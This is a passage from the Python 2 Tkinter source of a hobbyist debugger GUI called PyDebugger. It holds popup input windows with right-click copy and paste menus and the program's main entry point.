                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Bloacksize window(If you entered nothing, expect an error)"
        self.value=data = self.e.get()
        self.top.destroy()
        print "[+]\t\tAdded shellcode: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowDISS(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("10x80+300+300")
        self.l=Label(top,text="Address:")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")
        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Dissasem around window(If you entered nothing, expect an error)"
        self.value=data = self.e.get()
        self.top.destroy()
        print "[+]\t\tAdded shellcode: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowSearchMemory(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("10x80+300+300")
        self.l=Label(top,text="String:")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack()
        
    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Dissasem around window(If you entered nothing, expect an error)"
        self.value=data = self.e.get()
        self.top.destroy()
        print "[+]\t\tAdded shellcode: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"


def main():
    root = Tk()
    look = os.path.isfile('debugger.ico')
    if (look == True):
        root.iconbitmap(default='debugger.ico')
    root.geometry("750x450+300+300")
    print "[==Welcome to PyDebugger====]"
    print "[===Written by Starwarsfan2099]"
    print "[======Version: 3.1-1=========]"
    app = DebuggerMain(root)
    root.mainloop()


if __name__ == '__main__':
    main()  
